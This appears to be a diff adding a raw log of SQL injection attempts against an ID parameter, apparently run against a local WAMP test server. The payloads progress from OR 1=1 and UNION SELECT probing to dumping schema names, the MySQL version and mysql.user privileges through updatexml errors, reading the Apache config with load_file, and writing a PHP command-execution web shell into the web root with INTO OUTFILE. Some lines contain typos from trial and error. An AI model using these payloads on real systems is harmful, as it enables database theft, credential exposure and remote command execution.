@@ -1,0 +1,50 @@
+ID:1
+ID:1
+ID:1
+ID:1'
+ID:1'--
+ID:1--
+ID:-11--
+ID:--
+ID:1UNION SELECR 1,1,1--
+ID:1 UNION SELECR 1,1,1--
+ID:1 UNION SELECR 1,1,1 --
+ID:1 UNION SELECR 1,1 --
+ID:1 OR 1=1--
+ID:99 OR 1=1--
+ID:4 OR 1=1--
+ID:0 union select 1,2,3-- 
+ID:1 union select 1,2,3-- 
+ID:4 union select 1,2,3-- 
+ID:0 union select 1,2,3-- 
+ID:0
+ID:1
+ID:2
+ID:0 union select 1,2,3-- 
+ID:0 union select 4,2,3-- 
+ID:0 union select 4,2,6-- 
+ID:0 union select 1,group_concat(schema_name),2 from information_schema.schemata-- 
+ID:0 union select 1,group_concat(schema_name),2 from information_schema.schemata
+ID:0 union select 1
+ID:0
+ID:0 union select 1,2,3-- 
+ID:0 UNION SELECT 1
+ID:0 UNION SELECT 3
+ID:0 UNION SELECT 1,1,1
+ID:0 UNION SELECT 1,1,@@version
+ID:0 UNION SELECT 1,1,@@version
+ID:0 UNION SELECT 1,1,group_concat(schema_name) FROM information.schemata
+ID:0 UNION SELECT 1,1,group_concat(schema_name) FROM information.schema_schemata
+ID:0 UNION SELECT 1,1,group_concat(schema_name) FROM information_schema.schemata
+ID:0 union select 1,2,3-- 
+ID:0 UNION SELECT 1,1,1
+ID:0 UNION SELECT 1,1,\1
+ID:1 UNION SELECT a,a,\a
+ID:1 UNION SELECT a,a,\a
+ID:1 UNION SELECT "<?php system($_GET['cmd']); ?>",2,3 INTO OUTFILE 'C:/wamp64/www/shell.php'-- 
+ID:1 UNION SELECT "<?php system($_GET['cmd']); ?>",2,3 INTO OUTFILE 'C:/wamp64/www/shell.php'-- 
+ID:1 AND updatexml(1,concat(0x7e,version(),0x7e),1)-- 
+ID:0 union select 1,load_file('C:\\wamp64\\bin\\apache\\apache2.4.62.1\\conf\\httpd.conf'),1-- 
+ID:1 or updatexml(1,concat(0x7e,@@version,0x7e),1)
+ID:1 or updatexml(1,concat(0x7e,group_concat(user,0x7e,file_priv,0x7e),0x7e),1)
+ID:1 or updatexml(1,concat(0x7e,(select group_concat(user,0x7e,file_priv,0x7e) from mysql.user),0x7e),1)
